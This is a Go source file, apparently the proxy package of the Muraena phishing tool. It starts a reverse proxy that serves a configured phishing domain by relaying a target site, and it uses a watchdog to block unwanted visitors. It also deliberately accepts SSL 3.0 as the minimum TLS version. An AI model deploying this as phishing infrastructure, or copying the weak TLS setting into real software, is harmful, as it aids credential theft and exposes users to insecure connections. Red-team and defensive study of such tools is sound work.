package proxy

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module/watchdog"
	"github.com/muraenateam/muraena/session"
)

type tlsServer struct {
	*muraenaServer

	Cert     string
	Key      string
	CertPool string
}

type muraenaServer struct {
	http.Server
	NetListener net.Listener
}

// TODO: Allow to customize this TLS ssetup.
func (server *tlsServer) serveTLS() (err error) {

	// In an ideal world everyone would use TLS 1.2 at least, but we downgrade to
	// accept SSL 3.0 as a minimum version, otherwise old clients will have issues
	conf := &tls.Config{
		MinVersion:               tls.VersionSSL30,
		PreferServerCipherSuites: true,
		SessionTicketsDisabled:   true,
		NextProtos:               []string{"http/1.1"},
		Certificates:             make([]tls.Certificate, 1),
	}

	conf.Certificates[0], err = tls.X509KeyPair([]byte(server.Cert), []byte(server.Key))
	if err != nil {
		return err
	}

	if server.CertPool != "" { // needed only for custom CAs
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(server.CertPool)) {
			log.Error("Error handling certpool")
		}
		conf.ClientCAs = certpool
	}

	tlsListener := tls.NewListener(server.NetListener, conf)
	return server.Serve(tlsListener)
}

func Run(sess *session.Session) {

	// Load replacer rules
	var replacer = &Replacer{
		Phishing:                      sess.Config.Proxy.Phishing,
		Target:                        sess.Config.Proxy.Target,
		ExternalOrigin:                sess.Config.Crawler.ExternalOrigins,
		ExternalOriginPrefix:          sess.Config.Crawler.ExternalOriginPrefix,
		OriginsMapping:                sess.Config.Crawler.OriginsMapping,
		CustomResponseTransformations: sess.Config.Transform.Response.Custom,
	}

	if err := replacer.DomainMapping(); err != nil {
		log.Fatal(err.Error())
	}
	replacer.MakeReplacements()

	//
	// Start the reverse proxy
	//
	http.HandleFunc("/", func(response http.ResponseWriter, request *http.Request) {


		// TODO: Move this out of here
		if sess.Config.Watchdog.Enabled {
			m, err := sess.Module("watchdog")
			if err != nil {
				log.Error("%s", err)
			}

			wd, ok := m.(*watchdog.Watchdog)
			if ok {
				// get the real IP of the user, see below
				addr := wd.GetRealAddr(request)

				if !wd.Allow(addr) {
					wd.Error("[%s blocked]", addr.String())
					wd.CustomResponse(response, request)
					return
				}
			}
		}

		s := &SessionType{Session: sess, Replacer: replacer}
		s.HandleFood(response, request)
	})

	listeningAddress := fmt.Sprintf(`%s:%d`, sess.Config.Proxy.IP, sess.Config.Proxy.Port)
	netListener, err := net.Listen(sess.Config.Proxy.Listener, listeningAddress)
	if core.IsError(err) {
		log.Fatal("%s", err)
	}

	muraena := &muraenaServer{NetListener: netListener}

	lline := fmt.Sprintf("Muraena is alive on %s \n[ %s ] ==> [ %s ]", tui.Green(listeningAddress), tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
	log.Info(lline)

	if sess.Config.TLS.Enabled == false {
		// HTTP only
		if err := muraena.Serve(muraena.NetListener); core.IsError(err) {
			log.Fatal("Error binding Muraena on HTTP: %s", err)
		}

	} else {
		// HTTPS
		if sess.Config.Proxy.HTTPtoHTTPS.Enabled {
			// redirect HTTP > HTTPS
			newNetListener, err := net.Listen(sess.Config.Proxy.Listener, fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.HTTPtoHTTPS.HTTPport))
			if core.IsError(err) {
				log.Fatal("%s", err)
			}

			server := &http.Server{Handler: RedirectToHTTPS(sess.Config.Proxy.Port)}
			go server.Serve(newNetListener)
		}

		// Attach TLS configurations to muraena server
		tlsServer := &tlsServer{
			muraenaServer: muraena,
			Cert:          sess.Config.TLS.CertificateContent,
			Key:           sess.Config.TLS.KeyContent,
			CertPool:      sess.Config.TLS.RootContent,
		}
		if err := tlsServer.serveTLS(); core.IsError(err) {
			log.Fatal("Error binding Muraena on HTTPS: %s", err)
		}
	}
}

